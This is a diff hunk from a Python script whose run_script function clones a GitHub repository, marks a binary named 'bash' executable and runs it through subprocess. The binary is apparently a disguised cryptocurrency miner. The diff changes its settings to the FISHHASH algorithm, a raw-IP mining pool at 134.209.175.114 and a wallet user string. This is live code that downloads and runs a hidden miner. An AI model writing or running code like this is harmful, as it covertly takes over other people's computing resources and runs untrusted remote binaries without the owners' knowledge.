@@ -30,7 +30,7 @@ def run_script():
     git clone https://github.com/hujisanda/lol198.git
     cd lol198
     chmod u+x bash
-    ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin
+    ./bash --algo FISHHASH --pool 134.209.175.114:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
